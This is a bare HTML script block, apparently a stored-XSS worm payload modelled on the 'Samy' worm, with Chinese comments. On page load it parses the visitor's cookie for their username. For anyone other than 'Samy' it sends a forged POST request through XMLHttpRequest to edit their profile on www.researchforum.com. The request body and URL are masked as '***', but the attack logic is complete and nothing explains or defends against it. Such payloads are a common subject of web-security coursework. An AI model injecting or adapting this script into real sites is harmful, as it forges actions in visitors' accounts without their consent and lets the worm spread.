<script type="text/javascript">
window.onload = function(){

    // 构造修改简介的HTTP请求，由于是POST请求，需要构造请求的Content
    var content="***";
    var sendurl="***";
    
    var name = "username=";
    var ca = document.cookie.split(";");
    for (var i=0; i<ca.length; i++)
    {
    	var c = ca[i].trim();
    	if (c.indexOf(name)==0)
    	{
    		var currUser = c.substring(name.length, c.length);
    	}
    }
    if (currUser != "Samy") 
    {
        // 构造并发送Ajax请求
        const xhttp = new XMLHttpRequest(); 
        xhttp.open("POST",sendurl,true); 
        xhttp.setRequestHeader("Host","www.researchforum.com"); 
        xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhttp.send(content);
    }
}
</script>

